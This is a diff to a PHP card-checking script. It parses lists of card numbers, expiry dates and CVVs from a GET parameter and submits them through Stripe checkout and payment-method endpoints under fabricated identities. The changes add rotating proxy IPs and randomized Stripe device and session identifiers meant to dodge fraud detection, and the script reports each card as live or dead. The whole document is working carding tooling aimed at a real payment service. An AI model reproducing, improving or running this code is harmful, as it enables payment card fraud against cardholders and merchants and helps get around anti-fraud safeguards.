@@ -9,8 +9,8 @@ date_default_timezone_set($random_timezone);
 $resp = file_get_contents("https://lehikasa.online/random/?xiao=us");
 $a = json_decode($resp);
 $full_name  = $a->hello->person->full_name ?? "Alice Schuberg";
-$name = $a->hello->person->first_name ?? "xiao";
-$lname  = $a->hello->person->last_name ?? "tempest";
+$name = $a->hello->person->first_name ?? "Alice";
+$lname  = $a->hello->person->last_name ?? "Schuberg";
 $phone      = $a->hello->person->phone;
 $ua         = $a->hello->person->ua;
 $street     = $a->hello->street->name ?? "314 alden ave";
@@ -71,6 +71,7 @@ $lista = $_GET['cards'];
     $mes = multiexplode(array(":", "|", ""), $lista)[1];
     $ano = multiexplode(array(":", "|", ""), $lista)[2];
     $cvv = multiexplode(array(":", "|", ""), $lista)[3];
+    $mask = substr_replace($lista,'xxxxxxxxxxxx',0,12);
 
 if (strlen($mes) == 1) $mes = "0$mes";
 if (strlen($ano) == 2) $ano = "20$ano";
@@ -84,17 +85,43 @@ $xemail = $_GET['xemail'];
 
 $hydra = isset($_GET['hydra']) ? $_GET['hydra'] : '';
 $ip = isset($_GET['ip']) ? $_GET['ip'] : '';
-$proxy = !empty($ip) ? $ip : '';
+$ips_accounts = array(
+1 =>    '104.234.11.110:8020',
+        '172.86.123.167:8020',
+        '', //this is your default hosting server, so just leave it blank
+        '157.254.195.104:8020',
+        '166.0.94.105:8020',
+        '166.0.94.111:8020'
+    );
+$rotateips = $ips_accounts[array_rand($ips_accounts)];
+$proxy = !empty($ip) ? $ip : ''.$rotateips.'';
 $proxyauth = !empty($hydra) ? $hydra : '';
+
+function c($l){
+    $x = '0123456789abcdefghijklmnopqrstuvwxyz';
+    $y = strlen($x);
+    $z = '';
+  
+  for ($i=0; $i<$l ; $i++) { 
+   $z .= $x[rand(0, $y - 1)];
+  }
+    return $z;
+  } 
+
+$newguid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
+$newmuid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
+$newsid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
+$newsessionID = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
 
 $domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
 
 $ip_api_urls = array(
     'https://ipinfo.io/ip',
-    'https://api.ipify.org/',
+    //'https://api.ipify.org/',
     'https://checkip.amazonaws.com/',
-    'https://icanhazip.com/',
-    'https://ipapi.co/ip/'
+    'https://ipapi.co/ip/',
+    'http://ipv4.icanhazip.com/'
+    
 );
 $testmyip = $ip_api_urls[array_rand($ip_api_urls)];
 $ch = curl_init();
@@ -105,7 +132,7 @@ if (!empty($proxy)) {
         curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
     }
 }
-curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+//curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $curl_scraped_page = curl_exec($ch);
 $curl_error = curl_error($ch);
@@ -132,7 +159,7 @@ curl_setopt($ch, CURLOPT_POST, 1);
 $postfield = 'eid=NA&consent[terms_of_service]=accepted&key='.$pklive.'';
 
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+//curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
 $curl2 = curl_exec($ch);
 curl_close($ch);
@@ -148,10 +175,11 @@ if (!empty($proxy)) {
 }
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($ch, CURLOPT_POST, 1);
-$postfield = 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$full_name.'&billing_details[email]='.$xemail.'&billing_details[address][country]=US&billing_details[address][line1]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][postal_code]='.$zip.'&billing_details[address][state]='.$state.'&guid=e3180ce0-937d-41a5-a49b-34554202be6396cd52&muid=91670c3f-fc9d-417a-ad5b-55b56e3858e828a431&sid=f2b8e6cd-0795-4bcf-8439-b74dd87132b090531f&key='.$pklive.'&payment_user_agent=stripe.js%2F18b0f5a540%3B+stripe-js-v3%2F18b0f5a540%3B+checkout';
+//$postfield = 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$full_name.'&billing_details[email]='.$xemail.'&billing_details[address][country]=US&billing_details[address][line1]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][postal_code]='.$zip.'&billing_details[address][state]='.$state_full.'&guid='.$newguid.'&muid='.$newmuid.'&sid='.$newsid.'&key='.$pklive.'&payment_user_agent=stripe.js%2F18b0f5a540%3B+stripe-js-v3%2F18b0f5a540%3B+checkout';
+$postfield = 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$full_name.'&billing_details[email]='.$xemail.'&billing_details[address][country]=PH&guid='.$newguid.'&muid='.$newmuid.'&sid='.$newsid.'&key='.$pklive.'&payment_user_agent=stripe.js%2Fb7526fd6ae%3B+stripe-js-v3%2Fb7526fd6ae%3B+checkout';
 
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+//curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
   $curl0 = curl_exec($ch);
 curl_close($ch);
@@ -176,7 +204,7 @@ curl_setopt($ch, CURLOPT_POST, 1);
 $postfield = 'eid=NA&payment_method='.$pm.'&expected_amount='.$xamount.'&last_displayed_line_item_group_details[subtotal]='.$xamount.'&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key='.$pklive.'';
 
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+//curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
  $curl1 = curl_exec($ch);
 curl_close($ch);
@@ -233,7 +261,7 @@ $postfield = 'source='.$three_d_secure_2_source.'&browser=%7B%22fingerprintAttem
 
 
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+//curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
  $result = curl_exec($ch);
 curl_close($ch);
@@ -253,7 +281,7 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
 
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+//curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
 $result1 = curl_exec($ch);
 curl_close($ch);
@@ -272,7 +300,7 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
 
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
-curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+//curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
 $result2 = curl_exec($ch);
 curl_close($ch);
@@ -524,5 +552,11 @@ if (!empty($dc2)) {
      echo"<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Payment Failed $d_code</span><br>";
      exit();
    }
- 
+
+unset($ch);
+unlink($cookies);
+flush();
+ob_flush();
+ob_end_flush();
+
 ?>
